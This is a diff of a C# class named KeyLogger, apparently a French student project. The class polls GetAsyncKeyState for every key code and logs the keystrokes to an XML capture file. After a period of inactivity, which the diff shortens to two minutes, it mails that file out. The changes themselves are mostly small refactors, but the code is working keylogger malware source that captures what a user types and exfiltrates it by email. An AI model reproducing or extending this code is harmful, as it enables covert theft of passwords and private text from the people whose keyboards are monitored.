@@ -16,20 +16,13 @@ namespace ProjetKeyLogger
         private int sleep_time;
 
         //temps d'innactivité maximum avant l'envoi de mail
-        int temps_inactivite_max;
+        private int temps_inactivite_max;
 
+        //Chemin par défaut suivi du nom du fichier XML 
         private string file_path;
 
         //Initialisation du nombre de caractere tapé
         private int nb_caractere_tape;
-
-        public string File_Path
-        {
-            get
-            {
-                return file_path;
-            }
-        }
 
         //Constructeur
         public KeyLogger()
@@ -41,13 +34,13 @@ namespace ProjetKeyLogger
             sleep_time = 3;
 
             //on initialise le temps d'inactivité maximum (En minute)
-            temps_inactivite_max = 5;
+            temps_inactivite_max = 2;
 
             //On initialise la collection
             collection_enregistrement = new CollectionEnregistrement();
 
             //Chemin pour enregistrer le fichier XML
-            file_path = "TestXML.xml";
+            file_path = "Capture.xml";
 
         }
 
@@ -57,6 +50,7 @@ namespace ProjetKeyLogger
         [DllImport("user32.dll")]
         public static extern int GetAsyncKeyState(int cle);
 
+        
         public void capture()
         {
             //Création d'un objet Enregistrement qui contiendra le contenu de la capture clavier
@@ -79,12 +73,12 @@ namespace ProjetKeyLogger
                 //verification de l'état de chaque touche (up ou down)
                 for (int codeASCII = 0; codeASCII < 256; codeASCII++)
                 {
-                   
+                    
+
                     int statut_cle = GetAsyncKeyState(codeASCII);
                     //le statut d'un clé est a 0 si elle n'est pas active et est a 32769 si la touche est appuyée
                     if (statut_cle == 32769)
                     {
-
                         //le temps d'innactivité est reinitialisé
                         date_dernier_activite = DateTime.Now;
 
@@ -343,17 +337,13 @@ namespace ProjetKeyLogger
                                     }
                                     else
                                     {
-                                        enregistrement.ajouterContenu(Char.ToLower((char)codeASCII));
+                                        enregistrement.ajouterContenu(Char.ToLower((char)codeASCII).ToString());
                                     }
                                 }
-                                
-                                //Concatenation e la derniere touche tapée au contenu de l'enregistrement
-                                enregistrement.ajouterContenu((char)codeASCII);
-                                //On incrémente le nombre de caracteres tapé
-                                //!!!A mettre a chaque fois qu'un caractere est tapé!!!
                                
                                 break;
                         }
+
                         nb_caractere_tape += 1;
                     }
 
@@ -388,7 +378,6 @@ namespace ProjetKeyLogger
                                 
             }
         }
-
 
         //Envoie du fichier par mail
         private void envoieMail()
